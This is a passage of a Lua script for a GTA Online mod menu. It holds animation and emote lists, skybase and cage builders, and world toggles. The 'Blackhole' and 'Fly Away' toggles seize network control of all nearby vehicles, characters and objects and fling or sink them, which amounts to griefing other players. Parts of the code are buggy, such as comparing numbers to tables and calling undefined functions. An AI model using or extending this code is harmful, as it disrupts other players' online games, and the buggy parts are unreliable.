menu.toggle_loop(misc, "Clear All Notifications Loop", {"clearnotifs"}, "I recommend you use Console so you can see the log on screen when people try to crash you with this enabled.", function()
    menu.trigger_commands("clearnotifications")
    menu.trigger_commands("removenotifications")
    util.yield(6500)
end)

menu.toggle(misc, "Screenshot Mode", {}, "So you can take pictures <3", function(on)
	if on then
		menu.trigger_commands("screenshot on")
	else
		menu.trigger_commands("screenshot off")
	end
end)

menu.toggle(misc, "Rejoin Failed Joins", {"rejoinfail"}, "Joins previously failed transitions, Joins previously failed sessions but if failed will join new public.", function(state)
    local message_hash = HUD.GET_WARNING_SCREEN_MESSAGE_HASH()
    local my_player_id = players.user_ped()
    local playerstatus = {0, 1} -- This tells the player status, 0 for story mode and 1 for online mode.
    local message_hashes = {15890625, -398982408, -587688989} 
    if state then
        if message_hash == message_hashes then
            PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1.0)
            util.yield(200)
        end

        if my_player_id == playerstatus then
            NETWORK.NETWORK_JOIN_PREVIOUSLY_FAILED_TRANSITION(0, true)
            NETWORK.NETWORK_JOIN_PREVIOUSLY_FAILED_SESSION(0, true)

            wait_session_transition()
            util.toast("Trying To Rejoin")
            util.log("Trying To Rejoin")
            menu.trigger_commands("rejoin ")
        end
    end
end)

menu.action(misc, "Cage Self", {"cageself"}, "", function(cl)
    local number_of_cages = 12
    local elec_box = util.joaat("prop_contr_03b_ld")
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    pos.z -= 0.75
    request_model(elec_box)
    local temp_v3 = v3.new(0, 0, 0)
    for i = 1, number_of_cages do
        local angle = (i / number_of_cages) * 360
        temp_v3.z = angle
        local obj_pos = temp_v3:toDir()
        obj_pos:mul(8)
        obj_pos:add(pos)
        for offs_z = 1, 5 do
            local electric_cage = entities.create_object(elec_box, obj_pos)
            spawned_objects[#spawned_objects + 1] = electric_cage
            ENTITY.SET_ENTITY_ROTATION(electric_cage, 0.0, 0.0, angle, 2, 0)
            obj_pos.z += 1.8
            ENTITY.FREEZE_ENTITY_POSITION(electric_cage, true)
        end
    end
end)

menu.action(misc, "Skybase", {"skybase"}, "", function(cl)
    local number_of_cages = 3
    local elec_box = util.joaat("prop_contr_03b_ld")
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    local pos = v3.new(-236.19, -811.11, 345.60) --ENTITY.GET_ENTITY_COORDS(ped)
    request_model(elec_box)
    local temp_v3 = v3.new(0, 0, 0)
    for i = 1, number_of_cages do
        local angle = (i / number_of_cages) * 360
        temp_v3.z = angle
        local obj_pos = temp_v3:toDir()
        obj_pos:mul(4)
        obj_pos:add(pos)
        for offs_y = 1, 7 do
            local electric_cage = entities.create_object(elec_box, obj_pos)
            skybase[#skybase + 1] = electric_cage
            ENTITY.SET_ENTITY_ROTATION(electric_cage, 0.0, 0.0, 180.0, 0, 0)
            obj_pos.x += 2.5
            ENTITY.FREEZE_ENTITY_POSITION(electric_cage, true)
        end
        for offs_x = 1, 7 do
            local electric_cage = entities.create_object(elec_box, obj_pos)
            skybase[#skybase + 1] = electric_cage
            ENTITY.SET_ENTITY_ROTATION(electric_cage, 0.0, 0.0, 90.0, 0, 0)
            obj_pos.y += 2.5
            ENTITY.FREEZE_ENTITY_POSITION(electric_cage, true)
        end
        for offs_z = 1, 7 do
            local electric_cage = entities.create_object(elec_box, obj_pos)
            skybase[#skybase + 1] = electric_cage
            ENTITY.SET_ENTITY_ROTATION(electric_cage, 0.0, 0.0, 180.0, 0, 0)
            obj_pos.x -= 2.5
            ENTITY.FREEZE_ENTITY_POSITION(electric_cage, true)
        end
        for offs_x = 1, 7 do
            local electric_cage = entities.create_object(elec_box, obj_pos)
            skybase[#skybase + 1] = electric_cage
            ENTITY.SET_ENTITY_ROTATION(electric_cage, 0.0, 0.0, 90.0, 0, 0)
            obj_pos.y -= 2.5
            ENTITY.FREEZE_ENTITY_POSITION(electric_cage, true)
        end
    end
end)

island_block = 0
menu.action(misc, "Sky Island", {""}, "", function(sky_island)
    local c = {}
    c.x = 0
    c.y = 0
    c.z = 500
    PED.SET_PED_COORDS_KEEP_VEHICLE(players.user_ped(), c.x, c.y, c.z+5)
    if island_block == 0 or not ENTITY.DOES_ENTITY_EXIST(island_block) then
        request_model_load(1054678467)
        island_block = entities.create_object(1054678467, c)
    end
    skybase[#skybase + 1] = island_block
end)

menu.action(misc, "TP To Skybase", {"tpskybase"}, "Please Only Spawn 1 \nThe Position Is A Fixed Position", function()
    menu.trigger_commands("doors on")
    menu.trigger_commands("nodeathbarriers on")
    PED.SET_PED_COORDS_KEEP_VEHICLE(players.user_ped(), -236.19, -811.11, 348.60, false, false, false)
end)

menu.action(misc, "Delete Skybase/Island", {"delskybase"}, "", function()
    local entitycount = 0
    for i, object in ipairs(skybase) do
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object)
        entities.delete_by_handle(object)
        skybase[i] = nil
        entitycount += 1
    end
end)

--[[function Draw_Box_Peds()
    if not ENTITY.DOES_ENTITY_EXIST(targetEntity) then
        local flag = TraceFlag.peds | TraceFlag.vehicles | TraceFlag.pedsSimpleCollision | TraceFlag.objects
        local raycastResult = get_raycast_result(500.0, flag)
        if raycastResult.didHit and ENTITY.DOES_ENTITY_EXIST(raycastResult.hitEntity) then
            targetEntity = raycastResult.hitEntity
        end
    else
        for k, veh in pairs(entities.get_all_peds_as_handles()) do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
            draw_bounding_box(veh, true, {r = 80, g = 0, b = 255, a = 80})
            end
            local myPos = players.get_position(players.user())
            local entityPos = ENTITY.GET_ENTITY_COORDS(targetEntity, true)
            local camDir = CAM.GET_GAMEPLAY_CAM_ROT(0):toDir()
            local distance = myPos:distance(entityPos)
            if distance > 30.0 then distance = 30.0
            elseif distance < 10.0 then distance = 10.0 end
            local targetPos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), camDir, true)
            targetPos:mul(distance)
            targetPos:add(myPos)
            local direction = ENTITY.GET_ENTITY_COORDS(players.user_ped(), targetPos, true)
            direction:sub(entityPos)
            direction:normalise()
        if ENTITY.IS_ENTITY_A_PED(targetEntity) then
            direction:mul(1.0)
            local explosionPos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), entityPos, true)
            explosionPos:sub(direction)
            draw_bounding_box(targetEntity, false, {r = 80, g = 0, b = 255, a = 255})
        end
    end
end]]

--[[function Draw_Box_Pickups()
    if not ENTITY.DOES_ENTITY_EXIST(targetEntity) then
        local flag = TraceFlag.peds | TraceFlag.vehicles | TraceFlag.pedsSimpleCollision | TraceFlag.objects
        local raycastResult = get_raycast_result(500.0, flag)
        if raycastResult.didHit and ENTITY.DOES_ENTITY_EXIST(raycastResult.hitEntity) then
            targetEntity = raycastResult.hitEntity
        end
    else
        for k, veh in pairs(entities.get_all_pickups_as_handles()) do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
            draw_bounding_box(veh, true, {r = 80, g = 0, b = 255, a = 80})
            end
            local myPos = players.get_position(players.user())
            local entityPos = ENTITY.GET_ENTITY_COORDS(targetEntity, true)
            local camDir = CAM.GET_GAMEPLAY_CAM_ROT(0):toDir()
            local distance = myPos:distance(entityPos)
            if distance > 30.0 then distance = 30.0
            elseif distance < 10.0 then distance = 10.0 end
            local targetPos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), camDir, true)
            targetPos:mul(distance)
            targetPos:add(myPos)
            local direction = ENTITY.GET_ENTITY_COORDS(players.user_ped(), targetPos, true)
            direction:sub(entityPos)
            direction:normalise()
        if ENTITY.IS_ENTITY_A_PED(targetEntity) then
            direction:mul(1.0)
            local explosionPos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), entityPos, true)
            explosionPos:sub(direction)
            draw_bounding_box(targetEntity, false, {r = 80, g = 0, b = 255, a = 255})
        end
    end
end]]

--[[function Draw_Box_Objects()
    if not ENTITY.DOES_ENTITY_EXIST(targetEntity) then
        local flag = TraceFlag.peds | TraceFlag.vehicles | TraceFlag.pedsSimpleCollision | TraceFlag.objects
        local raycastResult = get_raycast_result(500.0, flag)
        if raycastResult.didHit and ENTITY.DOES_ENTITY_EXIST(raycastResult.hitEntity) then
            targetEntity = raycastResult.hitEntity
        end
    else
        for k, veh in pairs(entities.get_all_objects_as_handles()) do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
            draw_bounding_box(veh, true, {r = 80, g = 0, b = 255, a = 80})
            end
            local myPos = players.get_position(players.user())
            local entityPos = ENTITY.GET_ENTITY_COORDS(targetEntity, true)
            local camDir = CAM.GET_GAMEPLAY_CAM_ROT(0):toDir()
            local distance = myPos:distance(entityPos)
            if distance > 30.0 then distance = 30.0
            elseif distance < 10.0 then distance = 10.0 end
            local targetPos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), camDir, true)
            targetPos:mul(distance)
            targetPos:add(myPos)
            local direction = ENTITY.GET_ENTITY_COORDS(players.user_ped(), targetPos, true)
            direction:sub(entityPos)
            direction:normalise()
        if ENTITY.IS_ENTITY_A_PED(targetEntity) then
            direction:mul(1.0)
            local explosionPos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), entityPos, true)
            explosionPos:sub(direction)
            draw_bounding_box(targetEntity, false, {r = 80, g = 0, b = 255, a = 255})
        end
    end
end]]

--[[function Draw_Box_Vehicles()
    if not ENTITY.DOES_ENTITY_EXIST(targetEntity) then
        local flag = TraceFlag.peds | TraceFlag.vehicles | TraceFlag.pedsSimpleCollision | TraceFlag.objects
        local raycastResult = get_raycast_result(500.0, flag)
        if raycastResult.didHit and ENTITY.DOES_ENTITY_EXIST(raycastResult.hitEntity) then
            targetEntity = raycastResult.hitEntity
        end
    else
        for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
            draw_bounding_box(veh, true, {r = 80, g = 0, b = 255, a = 80})
            end
            local myPos = players.get_position(players.user())
            local entityPos = ENTITY.GET_ENTITY_COORDS(targetEntity, true)
            local camDir = CAM.GET_GAMEPLAY_CAM_ROT(0):toDir()
            local distance = myPos:distance(entityPos)
            if distance > 30.0 then distance = 30.0
            elseif distance < 10.0 then distance = 10.0 end
            local targetPos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), camDir, true)
            targetPos:mul(distance)
            targetPos:add(myPos)
            local direction = ENTITY.GET_ENTITY_COORDS(players.user_ped(), targetPos, true)
            direction:sub(entityPos)
            direction:normalise()
        if ENTITY.IS_ENTITY_A_PED(targetEntity) then
            direction:mul(1.0)
            local explosionPos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), entityPos, true)
            explosionPos:sub(direction)
            draw_bounding_box(targetEntity, false, {r = 80, g = 0, b = 255, a = 255})
        end
    end
end]]

    menu.toggle_loop(world2,"Nearby Vehicles Fly Away", {"flyawayvehicles"}, "", function()
        for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh, 1, 0, 0, 100, true, false, true)
            util.yield(10)
        end
    end)

    local dont_stop = false
	menu.toggle_loop(world2,"Blackhole Vehicles", {"blackholeveh"}, "", function(on)
		for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
            local locspeed2 = speed
            local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id), true)
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                speed = 100
                local x_vec = (holecoords['x']-vcoords['x'])*speed
                local y_vec = (holecoords['y']-vcoords['y'])*speed
                local z_vec = ((holecoords['z']+hole_zoff)-vcoords['z'])*speed
                ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh, 1, x_vec, y_vec, z_vec, true, false, true, true)
            if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
                VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
			end
		end
	end)

    menu.toggle_loop(world2,"Blackhole Peds", {"pedblackhole"}, "", function(on)
		for k, veh in pairs(entities.get_all_peds_as_handles()) do
            local locspeed2 = speed
            local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id), true)
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                speed = 100
                local x_vec = (holecoords['x']-vcoords['x'])*speed
                local y_vec = (holecoords['y']-vcoords['y'])*speed
                local z_vec = ((holecoords['z']+hole_zoff)-vcoords['z'])*speed
                ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh, 1, x_vec, y_vec, z_vec, true, false, true, true)
            if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
                VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
			end
		end
	end)

    menu.toggle_loop(world2,"Blackhole Objects", {"objectblackhole"}, "", function(on)
		for k, veh in pairs(entities.get_all_objects_as_handles()) do
            local locspeed2 = speed
            local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id), true)
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                speed = 100
                local x_vec = (holecoords['x']-vcoords['x'])*speed
                local y_vec = (holecoords['y']-vcoords['y'])*speed
                local z_vec = ((holecoords['z']+hole_zoff)-vcoords['z'])*speed
                ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh, 1, x_vec, y_vec, z_vec, true, false, true, true)
            if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
                VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
			end
		end
	end)

	hole_zoff = 50
    	menu.slider(world2, "Blackhole Offset", {"blackholeoffset"}, "", 0, 100, 50, 10, function(s)
    	hole_zoff = s
	end)

    menu.toggle_loop(world2, "All Cars Sink", {"sinkcars"}, "All Cars Sink.", function(on_toggle)
        for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
            local locspeed2 = speed
            local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id), true)
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                VEHICLE.SET_DISABLE_MAP_COLLISION(veh, vcoords, true)
            if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
                VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
            end
        end
    end)

--------------------------------------------------------------------------------------------------------------------------------------------------------
--Self

--==Full Credit For Animations By DEEZY==--
idleanims_root = menu.list(animations, "Idle", {""}, "List of animations to look cool even when you're standing still")
sitanims_root = menu.list(animations, "Sit", {""}, "Contains animations for sitting/laying/on the ground scenarios")
sexyanims_root = menu.list(animations, "Romance", {""}, "Exclusive list of animations to make love to your online soul mate")

emotes_root = menu.list(animations, "Emotes", {""}, "Categorized list of role based emotes and gestures")
actions_vroot = menu.list(emotes_root, "Actions", {""}, "Default interaction menu emotes that all the legit plebs have")
entrances_vroot = menu.list(emotes_root, "Entrances", {""}, "Introduce yourself with style")
tuneranims_vroot = menu.list(emotes_root, "Mechanic", {""}, "Maintenance, tuning animations related to vehicles")
medicanims_vroot = menu.list(emotes_root, "Medic", {""}, "Paramedic animations")
misc_vroot = menu.list(emotes_root, "Misc", {""}, "Break laws of physics and become the ultimate life form")
pairedemotes_vroot = menu.list(emotes_root, "Paired", {""}, "List of emotes that require a second player to pull it off")
copanims_vroot = menu.list(emotes_root, "Police", {""}, "Police officer animations")
copanims_pics_vroot = menu.list(copanims_vroot, "Photos", {""}, "Various suspect photos for roleplay occassions")
gymanims_vroot = menu.list(emotes_root, "Sports", {""}, "Consists of fitness and acrobacy animations")
gunanims_vroot = menu.list(emotes_root, "Tactical", {""}, "Weapon carry positions and shooting stances")
taunts_vroot = menu.list(emotes_root, "Taunts", {""}, "Offensive and mocking emotes")

dances_root = menu.list(animations, "Dances", {""}, "Dance styles for any environment")
dances_vroot = menu.list(dances_root, "After Party", {""}, "")
dances_vroot_afterpartyhigh = menu.list(dances_vroot, "High Intensity", {""}, "")
dances_vroot_afterpartymed = menu.list(dances_vroot, "Medium Intensity", {""}, "")
dances_vroot_afterpartylow = menu.list(dances_vroot, "Low Intensity", {""}, "")
dancescasual_vroot = menu.list(dances_root, "Casual", {""}, "")
dancesdisco_vroot = menu.list(dances_root, "Disco", {""}, "")
dances_erotic_vroot = menu.list(dances_root, "Erotic", {""}, "")
dancesfreestyle_vroot = menu.list(dances_root, "Freestyle", {""}, "")
dances_vroot = menu.list(dances_root, "Island Party", {""}, "")
dances_vroot_islandpartyhigh = menu.list(dances_vroot, "High Intensity", {""}, "")
dances_vroot_islandpartymed = menu.list(dances_vroot, "Medium Intensity", {""}, "")
dances_vroot_islandpartylow = menu.list(dances_vroot, "Low Intensity", {""}, "")
dances_vroot = menu.list(dances_root, "Nightclub", {""}, "")
dances_vroot_nightclubhigh = menu.list(dances_vroot, "High Intensity", {""}, "")
dances_vroot_nightclubmed = menu.list(dances_vroot, "Medium Intensity", {""}, "")
dances_vroot_nightclublow = menu.list(dances_vroot, "Low Intensity", {""}, "")
dancespartnered_vroot = menu.list(dances_root, "Partnered", {""}, "")

props_root = menu.list(animations, "Props", {""}, "Categorized list of static body attachments and animations paired with props")
accessories_vroot = menu.list(props_root, "Accessories", {""}, "Assorted list of body attachments")
foodanddrinks_vroot = menu.list(props_root, "Consumables", {""}, "Eat, sleep, drink, smoke, repeat")
guitars_vroot = menu.list(props_root, "Guitars", {""}, "Both attachable and playable")
guns_vroot = menu.list(props_root, "Guns", {""}, "Attaches to the back and waist for pistols")
melee_vroot = menu.list(props_root, "Melee", {""}, "Attaches to the back and right hand")
jewelry_vroot = menu.list(props_root, "Necklaces", {""}, "Attachments only")
plushes_vroot = menu.list(props_root, "Plushes & Toys", {""}, "Awww")
scenarios_vroot = menu.list(props_root, "Scenarios", {""}, "Mixed set of prop animations")

menu.action(animations, "Stop Animations", {"stopanim"}, "I Recommend Setting A Keybind To This", function(on_click)
    TASK.CLEAR_PED_TASKS(PLAYER.PLAYER_PED_ID())
end)

menu.action(animations,"Detach Objects", {"detachobjects"}, "I Recommend Setting A Keybind To This",function()
	removeObjectsFromPlayer(PLAYER.PLAYER_ID())
end)

function play_anim(dict, name, duration)
    ped = PLAYER.PLAYER_PED_ID()
    while not STREAMING.HAS_ANIM_DICT_LOADED(dict) do
        STREAMING.REQUEST_ANIM_DICT(dict)
        util.yield()
    end
    TASK.TASK_PLAY_ANIM(ped, dict, name, 3.0, 2.0, duration, 55, 1.0, false, false, false)
    --TASK_PLAY_ANIM(Ped ped, char* animDictionary, char* animationName, float blendInSpeed, float blendOutSpeed, int duration, int flag, float playbackRate, BOOL lockX, BOOL lockY, BOOL lockZ)
end

function play_animstopatlastframe(dict, name, duration)
    ped = PLAYER.PLAYER_PED_ID()
    while not STREAMING.HAS_ANIM_DICT_LOADED(dict) do
        STREAMING.REQUEST_ANIM_DICT(dict)
        util.yield()
    end
    TASK.TASK_PLAY_ANIM(ped, dict, name, 8.0, 8.0, -1, 2, 0.0, false, false, false)
    --TASK_PLAY_ANIM(Ped ped, char* animDictionary, char* animationName, float blendInSpeed, float blendOutSpeed, int duration, int flag, float playbackRate, BOOL lockX, BOOL lockY, BOOL lockZ)
end

function play_animnoloop(dict, name, duration)
    ped = PLAYER.PLAYER_PED_ID()
    while not STREAMING.HAS_ANIM_DICT_LOADED(dict) do
        STREAMING.REQUEST_ANIM_DICT(dict)
        util.yield()
    end
    TASK.TASK_PLAY_ANIM(ped, dict, name, 8.0, 8.0, -1, 16, 0.0, false, false, false)
    --TASK_PLAY_ANIM(Ped ped, char* animDictionary, char* animationName, float blendInSpeed, float blendOutSpeed, int duration, int flag, float playbackRate, BOOL lockX, BOOL lockY, BOOL lockZ)
end

function play_animplayonce(dict, name, duration)
    ped = PLAYER.PLAYER_PED_ID()
    while not STREAMING.HAS_ANIM_DICT_LOADED(dict) do
        STREAMING.REQUEST_ANIM_DICT(dict)
        util.yield()
    end
    TASK.TASK_PLAY_ANIM(ped, dict, name, 8.0, 8.0, -1, 0, 0.0, false, false, false)
    --TASK_PLAY_ANIM(Ped ped, char* animDictionary, char* animationName, float blendInSpeed, float blendOutSpeed, int duration, int flag, float playbackRate, BOOL lockX, BOOL lockY, BOOL lockZ)
end

function request_model_load(hash)
    request_time = os.time()
    if not STREAMING.IS_MODEL_VALID(hash) then
        return
    end
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end

function attachto(offx, offy, offz, pid, angx, angy, angz, hash, bone, isnpc, isveh)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local bone = PED.GET_PED_BONE_INDEX(ped, bone)
    local coords = ENTITY.GET_ENTITY_COORDS(ped, true)
    coords.x = coords['x']
    coords.y = coords['y']
    coords.z = coords['z']
    if isnpc then
        obj = entities.create_ped(1, hash, coords, 90.0)
    elseif isveh then
        obj = entities.create_vehicle(hash, coords, 90.0)
    else
        obj = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, coords['x'], coords['y'], coords['z'], true, false, false)
    end
    ENTITY.SET_ENTITY_INVINCIBLE(obj, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(obj, ped, bone, offx, offy, offz, angx, angy, angz, false, false, true, false, 0, true)
    ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(obj, false, true)
end

function removeObjectsFromPlayer(pid)
	ped = PLAYER.GET_PLAYER_PED(pid)
	if ped then
		for key, value in pairs(getAllObjects()) do
			if ped == ENTITY.GET_ENTITY_ATTACHED_TO(value) then
				if WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped,false) ~= value then
				RequestControlOfEnt(value)
				hash = ENTITY.GET_ENTITY_MODEL(value)
				ENTITY.DETACH_ENTITY(value, true,false)
				ENTITY.SET_ENTITY_COORDS(value,0,0,0,true,false,false,true)
				util.toast("Deleting object "..hash.." from "..PLAYER.GET_PLAYER_NAME(pid))
				end
			end
		end
	end
end

function getAllObjects()
	local out = {}
		for key, value in pairs(entities.get_all_objects_as_handles()) do
			out[#out+1] = value
		end
		for key, value in pairs(entities.get_all_objects_as_handles()) do
			out[#out+1] = value
		end
		for key, value in pairs(entities.get_all_objects_as_handles()) do
			out[#out+1] = value
		end
		for key, value in pairs(entities.get_all_objects_as_handles()) do
			out[#out+1] = value
		end
	return out
end

function RequestControlOfEnt(entity)
	local tick = 0
	local tries = 0
	NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
	while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and tick <= 1000 do
		NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
		tick = tick + 1
		tries = tries + 1
		if tries == 50 then 
			util.yield()
			tries = 0
		end
	end
	return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity)
end

---------------------------------------- IDLE ANIMATIONS ----------------------------------------

menu.action(idleanims_root, "Arms Crossed Behind", {""}, "", function(on_click)
    play_anim("anim@amb@carmeet@checkout_car@male_e@base", "base", -1)
end)

menu.action(idleanims_root, "Arms Crossed Behind Vibing", {""}, "", function(on_click)
    play_animstationary("anim@scripted@island@special_peds@elrubio@hs4_elrubio_stage1_ig1", "base_ped", -1)
end)

menu.action(idleanims_root, "Arms Crossed Formal", {""}, "", function(on_click)
    play_animstationary("amb@world_human_stand_guard@male@base", "base", -1)
end)

menu.action(idleanims_root, "Arms Crossed Relaxed", {""}, "", function(on_click)
    play_animstationary("amb@world_human_stand_impatient@female@no_sign@base", "base", -1)
end)

menu.action(idleanims_root, "Arms Crossed Stiff", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@peds@", "rcmme_amanda1_stand_loop_cop", -1)
end)

menu.action(idleanims_root, "Arms Crossed Observing", {""}, "", function(on_click)
    play_animstationary("mp_corona@single_team", "single_team_loop_boss", -1)
end)

menu.action(idleanims_root, "Arms Crossed Vibing", {""}, "", function(on_click)
    play_animstationary("anim@amb@beach_party@stand@female_a@idles", "idle_d", -1)
end)

menu.action(idleanims_root, "Arms Folded Chill", {""}, "", function(on_click)
    play_animstationary("anim@amb@business@bgen@bgen_no_work@", "stand_phone_phoneputdown_idle_nowork", -1)
end)

menu.action(idleanims_root, "Arms Folded Confident", {""}, "", function(on_click)
    play_animstationary("anim@amb@carmeet@checkout_car@male_c@base", "base", -1)
end)

menu.action(idleanims_root, "Ass Out", {""}, "", function(on_click)
    play_animstationary("sol_3_int-20", "cs_molly_dual-20", -1)
end)

menu.action(idleanims_root, "Confident Standing", {""}, "", function(on_click)
    play_animstationary("mp_fm_intro_cut", "world_human_standing_male_01_idle_01", -1)
end)

menu.action(idleanims_root, "Drunk Barely Standing", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@drinking@drinking_shots@ped_d@drunk", "idle", -1)
end)

menu.action(idleanims_root, "Flirty Stance", {""}, "", function(on_click)
    play_animstationary("mini@strip_club@idles@stripper", "stripper_idle_01", -1)
end)

menu.action(idleanims_root, "Hands On Belt Standing", {""}, "", function(on_click)
    play_anim("amb@world_human_cop_idles@male@base", "base", -1)
end)

menu.action(idleanims_root, "Hand On Waist", {""}, "", function(on_click)
    play_animstationary("amb@world_human_prostitute@hooker@base", "base", -1)
end)

menu.action(idleanims_root, "Hands On Waist", {""}, "", function(on_click)
    play_animstationary("timetable@amanda@ig_9", "ig_9_base_amanda", -1)
end)

menu.action(idleanims_root, "Hang Out Vibing", {""}, "", function(on_click)
    play_animstationary("amb@world_human_stand_impatient@male@no_sign@base", "base", -1)
end)

menu.action(idleanims_root, "Hold Waist Vibe", {""}, "", function(on_click)
    play_animstationary("anim@amb@carmeet@listen_music@male_c@idles", "idle_a", -1)
end)

menu.action(idleanims_root, "Lean Against Wall", {""}, "", function(on_click)
    play_animstationary("amb@lo_res_idles@", "world_human_lean_male_foot_up_lo_res_base", -1)
end)

menu.action(idleanims_root, "Lean Against Wall Confident", {""}, "", function(on_click)
    play_animstationary("amb@lo_res_idles@", "world_human_lean_male_foot_up_lo_res_base", -1)
	play_anim("switch@franklin@gang_taunt_p5", "fras_ig_6_p5_loop_g2", -1)
end)

menu.action(idleanims_root, "Lean Back", {""}, "", function(on_click)
    play_animstationary("anim_heist@arcade_property@wendy@bar@", "back_bar_base", -1)
end)

menu.action(idleanims_root, "Lean Back 2", {""}, "", function(on_click)
    play_animstationary("rcmnigel1aig_1", "base_02_willie", -1)
end)

menu.action(idleanims_root, "Lean Back 3", {""}, "", function(on_click)
	play_animfreeze("rcmnigel1aig_1", "base_02_willie", -1)
	play_anim("anim@scripted@carmeet@tun_meet_ig2_race@", "look_at_player", -1)
end)

menu.action(idleanims_root, "Lean Back Arms Folded", {""}, "", function(on_click)
    play_animfreeze("rcmnigel1aig_1", "base_02_willie", -1)
	play_anim("mp_corona@single_team", "single_team_loop_boss", -1)
end)

menu.action(idleanims_root, "Lean Back Gaming", {""}, "", function(on_click)
    request_model_load(94130617)
    attachto(0.0, 0.0, 0.0, players.user(), 0.0, 0.0, 0.0, 94130617, 28422, false, false)
    play_animstationary("missfbi4", "idle_loop_devin", -1)
end)

menu.action(idleanims_root, "Lean Left", {""}, "", function(on_click)
    play_animstationary("misscarstealfinalecar_5_ig_1", "waitloop_lamar", -1)
end)

menu.action(idleanims_root, "Lean On Counter", {""}, "", function(on_click)
